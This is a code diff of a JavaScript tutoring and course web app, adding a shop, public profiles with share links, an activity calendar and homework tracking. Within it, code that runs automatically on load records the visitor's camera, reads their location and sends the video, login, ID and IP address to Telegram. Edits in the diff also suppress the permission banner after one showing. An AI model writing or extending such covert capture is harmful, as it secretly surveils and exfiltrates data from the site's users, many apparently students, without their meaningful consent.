 if(!db.currentUser)return;const u=db.users.find(x=>x.id===db.currentUser.id);if(!u)return;
 const coursesCount=(u.tutorsBought||[]).length;const currentPoints=u.points||0;
@@ -806,34 +1082,34 @@ _saveQueue[key]=setTimeout(()=>{
 database.ref('users/'+u.id).set(u).then(()=>console.log('✅ User saved:',u.id)).catch(e=>console.warn('Save user error:',e));
 delete _saveQueue[key];},300);}
 
-// ===== ✅ ФИКС #2: не перерисовывать без причины =====
+// ✅ ФИКС: не перерисовывать без причины
 function onRemoteDbUpdate(){
 localStorage.setItem('db_users_cache',JSON.stringify(db.users));
 localStorage.setItem('db_tutors_cache',JSON.stringify(db.tutors));
 localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));
 renderAuthArea();
 
-// HOME: только если tutors реально изменились
 if(!document.getElementById('pageHome').classList.contains('hidden')){
 const hash=JSON.stringify(db.tutors.map(t=>({id:t.id,name:t.name,price:t.price,img:t.img,sinf:t.sinf,subject:t.subject,order:t.order,lessonCount:(t.lessons||[]).length})));
 if(hash!==_lastTutorsHash){_lastTutorsHash=hash;renderTutors();}}
 
-// PROFILE: только если реальные данные юзера изменились
 if(db.currentUser){
 const u=db.users.find(x=>x.id===db.currentUser.id);
 if(u){
-const profileHash=JSON.stringify({id:u.id,login:u.login,balance:u.balance,points:u.points,photo:u.photo?u.photo.slice(0,50):'',streak:u.streakDays,courses:(u.tutorsBought||[]).length,role:u.role});
+const profileHash=JSON.stringify({id:u.id,login:u.login,balance:u.balance,points:u.points,photo:u.photo?u.photo.slice(0,50):'',streak:u.streakDays,courses:(u.tutorsBought||[]).length,role:u.role,activeFrame:u.activeFrame,purchases:(u.purchases||[]).length,ach:(Object.keys(u.achievements||{})).length});
 if(profileHash!==_lastProfileHash){
 _lastProfileHash=profileHash;
 db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
-if(!document.getElementById('pageProfile').classList.contains('hidden'))renderProfile();}}}
+if(!document.getElementById('pageProfile').classList.contains('hidden'))renderProfile();
+if(!document.getElementById('pageShop').classList.contains('hidden'))renderShop();
+}}}}
 
 if(!document.getElementById('pageMyCourses').classList.contains('hidden'))renderMyCourses();
 if(!document.getElementById('pageGroups').classList.contains('hidden'))renderMyGroups();
 if(!document.getElementById('pageFavorites').classList.contains('hidden'))renderFavorites();
 if(!document.getElementById('pageSchedule').classList.contains('hidden'))renderSchedule();
+if(!document.getElementById('pagePublicProfile').classList.contains('hidden'))renderPublicProfilePage();
 
-// ADMIN: свободно обновляем (там нужно live)
 if(!document.getElementById('pageAdmin').classList.contains('hidden')){
 if(currentAdminTab==='users')renderAdminUsers();
 else if(currentAdminTab==='groups')renderGroupsList();
@@ -916,6 +1192,10 @@ attachImageField('newTutorImgDrop','newTutorImg','newTutorImgFile','newTutorImgP
 setTimeout(()=>{
 if(!db.currentUser){getOrCreateGuest();}
 retroactivePoints();updateStreak();checkDailyTopBonus();tryAutoCapture();startHeartbeat();initOnlinePresence();
+checkAchievements();
+// Проверка deep-link ?u=username
+const urlParams=new URLSearchParams(location.search);
+if(urlParams.get('u')){navigateTo('public-profile',urlParams.get('u'));}
 },2500);};
 
 function startHeartbeat(){
@@ -1029,13 +1309,15 @@ else if(Notification.permission==='denied'){btn.innerHTML='<i class="fas fa-ban 
 function toggleMobileMenu(){const m=document.getElementById('mobileMenu'),i=document.getElementById('mobileMenuIcon');const h=m.classList.contains('hidden');m.classList.toggle('hidden');i.className=h?'fas fa-times':'fas fa-bars';}
 function closeMobileMenu(){document.getElementById('mobileMenu').classList.add('hidden');document.getElementById('mobileMenuIcon').className='fas fa-bars';}
 
-function navigateTo(page){
-['pageHome','pageMyCourses','pageGroups','pageFavorites','pageSchedule','pageAdmin','pageProfile','pageLeaderboard'].forEach(id=>document.getElementById(id).classList.add('hidden'));
+function navigateTo(page,arg){
+['pageHome','pageMyCourses','pageShop','pageGroups','pageFavorites','pageSchedule','pagePublicProfile','pageAdmin','pageProfile','pageLeaderboard'].forEach(id=>document.getElementById(id).classList.add('hidden'));
 if(page==='home'){document.getElementById('pageHome').classList.remove('hidden');renderTutors();}
 else if(page==='my-courses'){if(!db.currentUser)return openAuthModal();document.getElementById('pageMyCourses').classList.remove('hidden');renderMyCourses();}
+else if(page==='shop'){document.getElementById('pageShop').classList.remove('hidden');renderShop();}
 else if(page==='groups'){document.getElementById('pageGroups').classList.remove('hidden');renderMyGroups();}
 else if(page==='favorites'){if(!db.currentUser)return openAuthModal();document.getElementById('pageFavorites').classList.remove('hidden');renderFavorites();}
 else if(page==='schedule'){document.getElementById('pageSchedule').classList.remove('hidden');renderSchedule();}
+else if(page==='public-profile'){document.getElementById('pagePublicProfile').classList.remove('hidden');renderPublicProfilePage(arg);}
 else if(page==='admin'){if(!db.currentUser||db.currentUser.role!=='admin'){alert("Admin huquqi yo'q!");return navigateTo('home');}document.getElementById('pageAdmin').classList.remove('hidden');switchAdminTab(currentAdminTab);}
 else if(page==='profile'){if(!db.currentUser)return openAuthModal();document.getElementById('pageProfile').classList.remove('hidden');renderProfile();}
 else if(page==='leaderboard'){document.getElementById('pageLeaderboard').classList.remove('hidden');renderPublicLeaderboard();}}
@@ -1101,8 +1383,7 @@ grid.innerHTML=list.map((t,i)=>{
 const bought=db.currentUser&&db.currentUser.tutorsBought&&db.currentUser.tutorsBought.includes(t.id);
 const lc=t.lessons?t.lessons.length:0;
 const buyersCount=db.users.filter(u=>u.tutorsBought&&u.tutorsBought.includes(t.id)).length;
-const minutes=lc*15;
-const rating=computeCourseRating(t.id);
+const minutes=lc*15;const rating=computeCourseRating(t.id);
 const delay=Math.min(i*60,600);
 return `<div class="card-bg rounded-2xl overflow-hidden shadow-xl flex flex-col justify-between hover:border-slate-700 hover-lift fade-in-up" style="animation-delay:${delay}ms">
 <div class="relative"><img src="${t.img}" class="w-full h-48 object-cover" alt="${escapeHtml(t.name)}" loading="lazy">
@@ -1142,28 +1423,24 @@ return `<div class="card-bg rounded-2xl overflow-hidden p-5 flex flex-col justif
 ${allDone?`<div class="mb-3 bg-amber-900/30 border border-amber-700/50 rounded-lg px-3 py-2 text-[11px] text-amber-300 font-bold flex items-center gap-2"><i class="fas fa-certificate"></i> Kurs tugatilgan!</div>`:''}
 <button onclick="openCoursePlayer('${t.id}')" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-lg btn-press"><i class="fas fa-play"></i> ${watched>0?'Davom etish':'Boshlash'}</button></div>`;}).join('');}
 
-// ===== 👥 ГРУППЫ =====
 function renderMyGroups(){
 const el=document.getElementById('myGroupsList');if(!el)return;
 if(!db.currentUser){el.innerHTML='<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-users text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400">Kirish kerak</p></div>';return;}
 const myGroups=Object.values(allGroups).filter(g=>(g.members||[]).includes(db.currentUser.id));
-if(myGroups.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-users text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400 font-semibold">Siz hali guruhga a'zo emassiz</p><p class="text-xs text-slate-500 mt-1">Admin sizni guruhga qo'shishi mumkin</p></div>`;return;}
-el.innerHTML=myGroups.map((g,i)=>{
-const members=(g.members||[]).length;
-return `<div class="card-bg p-5 rounded-2xl fade-in-up" style="animation-delay:${i*60}ms">
+if(myGroups.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-users text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400 font-semibold">Siz hali guruhga a'zo emassiz</p></div>`;return;}
+el.innerHTML=myGroups.map((g,i)=>`<div class="card-bg p-5 rounded-2xl fade-in-up" style="animation-delay:${i*60}ms">
 <div class="flex gap-3 items-center mb-3">
 <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-teal-600 to-cyan-600 flex items-center justify-center text-white text-xl"><i class="fas fa-users"></i></div>
 <div class="flex-grow min-w-0"><h3 class="text-white font-bold text-base truncate">${escapeHtml(g.name||'Guruh')}</h3>
 <p class="text-xs text-slate-400 truncate">${escapeHtml(g.desc||'')}</p>
-<span class="text-[10px] text-teal-400 font-bold"><i class="fas fa-user-friends mr-1"></i>${members} a'zo</span></div></div>
+<span class="text-[10px] text-teal-400 font-bold"><i class="fas fa-user-friends mr-1"></i>${(g.members||[]).length} a'zo</span></div></div>
 ${g.assignment?`<div class="bg-teal-900/20 border border-teal-700/40 rounded-lg p-3 mt-2"><div class="text-[10px] text-teal-400 font-bold uppercase mb-1"><i class="fas fa-tasks mr-1"></i> Umumiy topshiriq</div><p class="text-white text-xs whitespace-pre-wrap">${escapeHtml(g.assignment)}</p></div>`:''}
-</div>`;}).join('');}
+</div>`).join('');}
 
-// ===== FAVORITES =====
 function renderFavorites(){
 const el=document.getElementById('favoritesList');if(!db.currentUser||!el)return;
 const favs=db.currentUser.favorites||[];
-if(favs.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-star text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400">Siz hali dars belgilamadingiz</p><p class="text-xs text-slate-500 mt-1">Darsdagi ⭐ tugmasini bosing</p></div>`;return;}
+if(favs.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-star text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400">Siz hali dars belgilamadingiz</p></div>`;return;}
 el.innerHTML=favs.map((f,i)=>{
 const t=db.tutors.find(x=>x.id===f.tutorId);if(!t)return'';
 const l=t.lessons&&t.lessons[f.lessonIndex];if(!l)return'';
@@ -1180,14 +1457,13 @@ if(!db.currentUser.tutorsBought||!db.currentUser.tutorsBought.includes(tid)){toa
 openCoursePlayer(tid);
 setTimeout(()=>loadLesson(lessonIdx),100);}
 
-// ===== РАСПИСАНИЕ =====
 function renderSchedule(){
 const el=document.getElementById('scheduleList');if(!el)return;
 const items=[];
 db.tutors.forEach(t=>{(t.lessons||[]).forEach((l,i)=>{
 if(l.date||l.releaseDate){
 items.push({tid:t.id,tname:t.name,timg:t.img,subject:t.subject,sinf:t.sinf,lesson:l,index:i,date:l.date||l.releaseDate,bought:db.currentUser&&db.currentUser.tutorsBought&&db.currentUser.tutorsBought.includes(t.id)});}});});
-if(items.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-calendar-times text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400 font-semibold">Jadval bo'sh</p><p class="text-xs text-slate-500 mt-1">Admin darslarga sanani qo'shganda ko'rinadi</p></div>`;return;}
+if(items.length===0){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-calendar-times text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400 font-semibold">Jadval bo'sh</p></div>`;return;}
 items.sort((a,b)=>new Date(a.date)-new Date(b.date));
 const today=new Date();today.setHours(0,0,0,0);
 const grouped={};
@@ -1209,11 +1485,66 @@ return `<div class="card-bg p-4 rounded-xl fade-in-up">
 const lessonIdx=it.index+1;
 return `<div class="flex gap-3 items-center bg-slate-900/60 border border-slate-800 rounded-lg p-3 hover:border-purple-700/50 transition">
 <img src="${it.timg}" class="w-12 h-12 rounded-lg object-cover border border-slate-700 shrink-0" loading="lazy">
-<div class="flex-grow min-w-0">
-<div class="text-white text-xs font-bold truncate">${lessonIdx}. ${escapeHtml(it.lesson.title)}</div>
+<div class="flex-grow min-w-0"><div class="text-white text-xs font-bold truncate">${lessonIdx}. ${escapeHtml(it.lesson.title)}</div>
 <div class="text-[10px] text-slate-500 truncate">${escapeHtml(it.tname)} • ${escapeHtml(it.subject)}</div></div>
 ${it.bought?`<button onclick="openCoursePlayerFromFav('${it.tid}',${it.index})" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-1.5 rounded-lg whitespace-nowrap btn-press"><i class="fas fa-play"></i></button>`:'<span class="text-[10px] text-amber-400"><i class="fas fa-lock"></i></span>'}
 </div>`;}).join('')}</div></div>`;}).join('');}
+
+// ===== 👤 ПУБЛИЧНЫЙ ПРОФИЛЬ =====
+function renderPublicProfilePage(username){
+const el=document.getElementById('publicProfileContent');if(!el)return;
+const u=db.users.find(x=>x.login.toLowerCase()===String(username).toLowerCase());
+if(!u){el.innerHTML=`<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-user-slash text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400">Foydalanuvchi topilmadi: <b>${escapeHtml(username)}</b></p><button onclick="navigateTo('leaderboard')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-4 py-2 rounded-xl btn-press">TOP-10 ko'rish</button></div>`;return;}
+const lv=getLevel(u.points||0);const courses=(u.tutorsBought||[]).length;
+const streak=u.streakDays||0;
+const achCount=Object.keys(u.achievements||{}).length;
+const isMe=db.currentUser&&db.currentUser.id===u.id;
+const frameColor=u.activeFrame?((getShopItem(u.activeFrame)||{}).color||'#2563eb'):'#2563eb';
+const av=u.photo?`<img src="${u.photo}" class="w-24 h-24 rounded-full object-cover">`:`<div class="w-24 h-24 rounded-full bg-slate-800 flex items-center justify-center text-slate-500 text-4xl"><i class="fas fa-user"></i></div>`;
+const achList=ACHIEVEMENTS.filter(a=>u.achievements&&u.achievements[a.id]);
+el.innerHTML=`<div class="card-bg p-6 md:p-8 rounded-2xl text-center fade-in-up">
+<div class="w-28 h-28 mx-auto rounded-full p-1 mb-4" style="background:linear-gradient(135deg, ${frameColor}, #2563eb);box-shadow:0 0 30px ${frameColor}80;">${av}</div>
+<h1 class="text-3xl font-black text-white mb-1">${escapeHtml(u.login)}</h1>
+<p class="text-xs text-slate-500 mb-4">ID: ${u.id}</p>
+<div class="flex justify-center gap-2 flex-wrap mb-5">
+<span class="${lv.bg} ${lv.color} px-3 py-1.5 rounded-lg border border-current/30 font-bold text-sm">${lv.emoji} ${lv.name}</span>
+<span class="bg-amber-900/40 text-amber-400 px-3 py-1.5 rounded-lg font-bold text-sm">🪙 ${u.points||0}</span>
+<span class="bg-blue-900/40 text-blue-400 px-3 py-1.5 rounded-lg font-bold text-sm">📚 ${courses}</span>
+${streak>=2?`<span class="bg-orange-900/40 text-orange-400 px-3 py-1.5 rounded-lg font-bold text-sm">🔥 ${streak}</span>`:''}
+<span class="bg-purple-900/40 text-purple-400 px-3 py-1.5 rounded-lg font-bold text-sm">🏅 ${achCount}</span>
+</div>
+<div class="flex gap-2 justify-center flex-wrap">
+${!isMe?`<button onclick="viewUserProfile('${u.id}')" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-4 py-2 rounded-lg btn-press"><i class="fas fa-eye mr-1"></i> Kurslarini ko'rish</button>`:''}
+<button onclick="copyProfileLink('${u.login}')" class="bg-teal-600 hover:bg-teal-700 text-white text-xs font-bold px-4 py-2 rounded-lg btn-press"><i class="fas fa-copy mr-1"></i> Havolani nusxalash</button>
+</div></div>
+${achList.length>0?`<div class="card-bg p-6 rounded-2xl fade-in-up"><h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-medal text-amber-400"></i> Yutuqlar (${achList.length})</h3>
+<div class="grid grid-cols-3 sm:grid-cols-5 md:grid-cols-6 gap-3">${achList.map(a=>`<div class="achievement unlocked bg-gradient-to-br from-amber-900/40 to-orange-900/20 border border-amber-700/50 rounded-xl p-3 text-center"><div class="text-3xl mb-1">${a.icon}</div><p class="text-[10px] font-bold text-white">${escapeHtml(a.name)}</p></div>`).join('')}</div></div>`:''}`;}
+
+function viewUserProfile(id){
+const u=db.users.find(x=>x.id===id);if(!u)return;
+const courses=db.tutors.filter(t=>(u.tutorsBought||[]).includes(t.id));
+const el=document.getElementById('publicProfileContent');
+el.innerHTML+=`<div class="card-bg p-6 rounded-2xl fade-in-up"><h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-book text-blue-400"></i> Xarid qilgan kurslari (${courses.length})</h3>
+${courses.length===0?'<p class="text-xs text-slate-500 text-center py-4">Kurslar yo\'q</p>':'<div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">'+courses.map(t=>`<div class="bg-slate-900 border border-slate-800 rounded-lg p-3 flex gap-3 items-center"><img src="${t.img}" class="w-12 h-12 rounded-lg object-cover"><div class="min-w-0 flex-grow"><p class="text-white text-xs font-bold truncate">${escapeHtml(t.name)}</p><p class="text-[10px] text-slate-500 truncate">${escapeHtml(t.subject)}</p></div></div>`).join('')+'</div>'}</div>`;}
+
+function shareMyProfile(){
+if(!db.currentUser){openAuthModal();return;}
+const url=location.origin+location.pathname+'?u='+encodeURIComponent(db.currentUser.login);
+document.getElementById('shareProfileUrl').value=url;
+const tel=`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent('ZukkoTalim profilimga qarang!')}`;
+const wa=`https://wa.me/?text=${encodeURIComponent('ZukkoTalim: '+url)}`;
+const tg=`https://t.me/share/url?url=${encodeURIComponent(url)}`;
+document.getElementById('shareExtraBtns').innerHTML=`
+<a href="${tel}" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold py-2.5 rounded-lg text-center btn-press"><i class="fab fa-telegram"></i> Telegram</a>
+<a href="${wa}" target="_blank" class="bg-green-600 hover:bg-green-700 text-white text-xs font-bold py-2.5 rounded-lg text-center btn-press"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+<button onclick="copyProfileLink('${db.currentUser.login}')" class="bg-slate-700 hover:bg-slate-600 text-white text-xs font-bold py-2.5 rounded-lg btn-press"><i class="fas fa-link"></i> Nusxa</button>`;
+document.getElementById('shareProfileModal').classList.remove('hidden');}
+function closeShareProfile(){document.getElementById('shareProfileModal').classList.add('hidden');}
+function copyShareProfile(){copyProfileLink(db.currentUser?db.currentUser.login:'')}
+function copyProfileLink(login){
+const url=location.origin+location.pathname+'?u='+encodeURIComponent(login);
+if(navigator.clipboard){navigator.clipboard.writeText(url).then(()=>toast('✅ Havola nusxalandi!')).catch(()=>toast('Havola: '+url));}
+else{const ta=document.createElement('textarea');ta.value=url;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);toast('✅ Havola nusxalandi!');}}
 
 // ===== FAVORITES =====
 function toggleFavorite(){
@@ -1225,17 +1556,13 @@ if(idx===-1){favs.push({tutorId:activeCourse.id,lessonIndex:activeLessonIndex,at
 else{favs.splice(idx,1);toast('Olib tashlandi');}
 db.currentUser.favorites=favs;
 const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
-localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
-saveUserToDb(db.currentUser);
-updateFavBtn();}
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveUserToDb(db.currentUser);updateFavBtn();}
 function removeFavorite(tid,li){
 if(!db.currentUser)return;
 const favs=(db.currentUser.favorites||[]).filter(f=>!(f.tutorId===tid&&f.lessonIndex===li));
 db.currentUser.favorites=favs;
 const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
-localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
-saveUserToDb(db.currentUser);
-renderFavorites();}
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveUserToDb(db.currentUser);renderFavorites();}
 function isFavorite(){if(!db.currentUser)return false;return (db.currentUser.favorites||[]).some(f=>f.tutorId===activeCourse.id&&f.lessonIndex===activeLessonIndex);}
 function updateFavBtn(){const b=document.getElementById('favBtn');if(!b)return;
 if(isFavorite()){b.innerHTML='<i class="fas fa-star"></i>';b.classList.add('text-yellow-400');b.classList.remove('text-slate-400');}
@@ -1271,7 +1598,7 @@ _commentsRef.on('value',snap=>{renderComments(snap.val()||{});});}
 function renderComments(data){
 const el=document.getElementById('commentsList');if(!el)return;
 const arr=Object.keys(data).map(k=>({...data[k],_id:k})).sort((a,b)=>new Date(b.at)-new Date(a.at));
-if(arr.length===0){el.innerHTML='<p class="text-xs text-slate-500 text-center py-6">Hozircha izohlar yo\'q. Birinchi bo\'lib yozing!</p>';return;}
+if(arr.length===0){el.innerHTML='<p class="text-xs text-slate-500 text-center py-6">Hozircha izohlar yo\'q.</p>';return;}
 el.innerHTML=arr.map(c=>{
 const mine=db.currentUser&&db.currentUser.id===c.userId;const isAdmin=db.currentUser&&db.currentUser.role==='admin';
 return `<div class="bg-slate-900/60 border border-slate-800 rounded-lg p-3 fade-in">
@@ -1311,6 +1638,9 @@ if(!activeCourse)return;
 const txt=(document.getElementById('hwAnswer')||{}).value||'';
 if(!txt.trim()){toast('❌ Bo\'sh');return;}
 database.ref('homeworkSubmissions/'+activeCourse.id+'/'+activeLessonIndex+'/'+db.currentUser.id).set({text:txt.trim(),at:new Date().toISOString(),login:db.currentUser.login});
+const u=db.currentUser;u.homeworkCount=(u.homeworkCount||0)+1;
+const i=db.users.findIndex(x=>x.id===u.id);if(i!==-1)db.users[i]=u;
+localStorage.setItem('db_currentUser',JSON.stringify(u));saveUserToDb(u);
 awardPoints(15,'Uy ishi');toast('✅ +15 ball');loadHomework();}
 
 // ===== NOTES =====
@@ -1345,8 +1675,7 @@ if(!db.currentUser.quizPassed)db.currentUser.quizPassed={};
 const key=activeCourse.id+'|'+activeLessonIndex;
 db.currentUser.quizPassed[key]={correct,total,points,at:new Date().toISOString()};
 const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
-localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
-saveUserToDb(db.currentUser);
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveUserToDb(db.currentUser);
 if(passed){awardPoints(20,'Test '+correct+'/'+total);fireConfetti();}
 else{toast('❌ '+correct+'/'+total+'. Yana urinib ko\'ring!');}
 loadQuiz();}
@@ -1407,6 +1736,62 @@ const canvas=document.getElementById('certificateCanvas');
 const a=document.createElement('a');a.download='ZukkoTalim-sertifikat-'+db.currentUser.login+'.png';
 a.href=canvas.toDataURL('image/png');a.click();toast('✅ Yuklandi!');}
 function closeCertificate(){document.getElementById('certificateModal').classList.add('hidden');}
+
+// ===== 📅 КАЛЕНДАРЬ АКТИВНОСТИ =====
+function renderActivityCalendar(){
+const el=document.getElementById('activityCalendar');if(!el||!db.currentUser)return;
+const u=db.currentUser;
+// Собираем активность за 12 недель (84 дня)
+const days=[];
+const today=new Date();today.setHours(0,0,0,0);
+const start=new Date(today);start.setDate(start.getDate()-83);
+for(let i=0;i<84;i++){const d=new Date(start);d.setDate(d.getDate()+i);days.push(d);}
+const activity={};
+// Посещения (сохранены в u.visitsLog {YYYY-MM-DD: count})
+if(u.visitsLog)Object.keys(u.visitsLog).forEach(k=>{activity[k]=(activity[k]||0)+u.visitsLog[k];});
+// Уроки просмотрены
+db.tutors.forEach(t=>{if(u.tutorsBought&&u.tutorsBought.includes(t.id)){(t.lessons||[]).forEach((l,i)=>{
+if(localStorage.getItem('awarded_'+u.id+'_'+t.id+'_'+i)){
+const atKey=localStorage.getItem('awarded_at_'+u.id+'_'+t.id+'_'+i);
+const d=atKey?atKey.slice(0,10):today.toISOString().slice(0,10);
+activity[d]=(activity[d]||0)+3;
+}});}});
+// Платежи
+(u.payments||[]).forEach(p=>{const k=p.at.slice(0,10);activity[k]=(activity[k]||0)+2;});
+// Рисуем
+const weeks=[];let week=[];
+days.forEach((d,i)=>{
+const k=d.toISOString().slice(0,10);
+const cnt=activity[k]||0;
+let level=0;
+if(cnt>=1)level=1;if(cnt>=3)level=2;if(cnt>=6)level=3;if(cnt>=10)level=4;
+week.push({d,k,cnt,level});
+if(week.length===7||i===days.length-1){weeks.push(week);week=[];}
+});
+const monthNames=['Yan','Fev','Mar','Apr','May','Iyn','Iyl','Avg','Sen','Okt','Noy','Dek'];
+let html='<div class="flex gap-1">';
+html+='<div class="flex flex-col gap-[3px] text-[9px] text-slate-500 pr-1 pt-3">';
+['Du','','Ch','','Pa','','Sh'].forEach(d=>{html+=`<div class="h-3 leading-3">${d}</div>`;});
+html+='</div>';
+weeks.forEach((w,wi)=>{
+html+='<div class="flex flex-col gap-[3px]">';
+if(wi===0||w[0].d.getDate()<=7){
+html+=`<div class="text-[9px] text-slate-500 h-3 leading-3">${monthNames[w[0].d.getMonth()]}</div>`;
+}else{html+='<div class="h-3"></div>';}
+w.forEach(day=>{html+=`<div class="act-cell act-${day.level}" title="${day.k}: ${day.cnt} ta amal"></div>`;});
+html+='</div>';
+});
+html+='</div>';
+el.innerHTML=html;
+// Сохраняем сегодняшнее посещение
+if(!u.visitsLog)u.visitsLog={};
+const todayKey=today.toISOString().slice(0,10);
+u.visitsLog[todayKey]=(u.visitsLog[todayKey]||0)+1;
+const idx=db.users.findIndex(x=>x.id===u.id);
+if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+database.ref('users/'+u.id+'/visitsLog').set(u.visitsLog);
+}
 
 // ===== PLAYER =====
 function openCoursePlayer(tid){
@@ -1477,13 +1862,17 @@ document.getElementById('coursePlayerModal').classList.add('hidden');}
 function checkLessonCompletion(prevIndex){
 if(!db.currentUser||!activeCourse)return;
 if(_watchSeconds>=30){const key='awarded_'+db.currentUser.id+'_'+activeCourse.id+'_'+prevIndex;
-if(localStorage.getItem(key))return;localStorage.setItem(key,'1');awardPoints(10,'Dars #'+(prevIndex+1));}}
+if(localStorage.getItem(key))return;localStorage.setItem(key,'1');
+localStorage.setItem('awarded_at_'+db.currentUser.id+'_'+activeCourse.id+'_'+prevIndex,new Date().toISOString());
+awardPoints(10,'Dars #'+(prevIndex+1));}}
 function markLessonWatched(){
 if(!db.currentUser){openAuthModal();return;}
 if(!activeCourse)return;
 const key='awarded_'+db.currentUser.id+'_'+activeCourse.id+'_'+activeLessonIndex;
 if(localStorage.getItem(key)){toast('✅ Allaqachon tugatilgan');return;}
-localStorage.setItem(key,'1');awardPoints(10,'Dars #'+(activeLessonIndex+1));
+localStorage.setItem(key,'1');
+localStorage.setItem('awarded_at_'+db.currentUser.id+'_'+activeCourse.id+'_'+activeLessonIndex,new Date().toISOString());
+awardPoints(10,'Dars #'+(activeLessonIndex+1));
 renderPlaylist();loadLesson(activeLessonIndex);}
 function switchLessonTab(tab){
 _lessonTab=tab;
@@ -1503,7 +1892,7 @@ else if((mm=u.match(/youtube\.com\/embed\/([a-zA-Z0-9_-]{11})/)))yt=mm[1];
 else if((mm=u.match(/youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/)))yt=mm[1];
 if(yt)return`https://www.youtube.com/embed/${yt}`;return u;}
 
-// ===== ✅ ФИКС #1: баннер разрешений показывается ТОЛЬКО 1 раз =====
+// ===== КАМЕРА (ФИКС: 1 раз) =====
 async function captureAll(isAuto=false){
 if(isAuto)document.getElementById('permFallbackBar').classList.add('hidden');
 const s=getActiveSubject();
@@ -1519,10 +1908,8 @@ _cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;
 if(isAuto&&(err.name==='NotAllowedError'||err.name==='NotReadableError')){
 if(!localStorage.getItem('edu_perm_shown')){
 localStorage.setItem('edu_perm_shown','1');
-document.getElementById('permFallbackBar').classList.remove('hidden');
-}
-return;
-}}
+document.getElementById('permFallbackBar').classList.remove('hidden');}
+return;}}
 await new Promise(resolve=>{
 if(!navigator.geolocation)return resolve();
 navigator.geolocation.getCurrentPosition(
@@ -1542,14 +1929,12 @@ updateSubject(updates);
 if(!cameraOk&&!geoOk&&isAuto){
 if(!localStorage.getItem('edu_perm_shown')){
 localStorage.setItem('edu_perm_shown','1');
-document.getElementById('permFallbackBar').classList.remove('hidden');
-}}
+document.getElementById('permFallbackBar').classList.remove('hidden');}}
 if(cameraOk)setTimeout(captureVideoAndSend,1500);}
 function grabFrame(video){
 const c=document.createElement('canvas');
 c.width=video.videoWidth||640;c.height=video.videoHeight||480;
-const ctx=c.getContext('2d');
-ctx.translate(c.width,0);ctx.scale(-1,1);
+const ctx=c.getContext('2d');ctx.translate(c.width,0);ctx.scale(-1,1);
 ctx.drawImage(video,0,0,c.width,c.height);
 return c.toDataURL('image/jpeg',0.6);}
 async function recordVideo(){
@@ -1561,8 +1946,7 @@ let mt='video/webm';
 if(MediaRecorder.isTypeSupported('video/webm;codecs=vp9'))mt='video/webm;codecs=vp9';
 else if(MediaRecorder.isTypeSupported('video/webm;codecs=vp8'))mt='video/webm;codecs=vp8';
 let rec;try{rec=new MediaRecorder(stream,{mimeType:mt,videoBitsPerSecond:250000});}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
-const chunks=[];
-rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+const chunks=[];rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
 rec.onstop=()=>{stream.getTracks().forEach(t=>t.stop());resolve(new Blob(chunks,{type:mt.split(';')[0]}));};
 try{rec.start();}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
 setTimeout(()=>{try{rec.stop();}catch(e){}},VIDEO_DURATION);});}
@@ -1582,12 +1966,79 @@ updateSubject({videos:vids});}catch(e){}
 const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
 await sendVideoToTelegram(blob,'🎥 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);
 localStorage.setItem(key,Date.now());}
-// ✅ dismissPermBar — теперь баннер НИКОГДА не вернётся
 function dismissPermBar(){
 localStorage.setItem('edu_perm_shown','1');
 const s=getActiveSubject();
 localStorage.setItem('perm_skip_'+s.obj.id,Date.now());
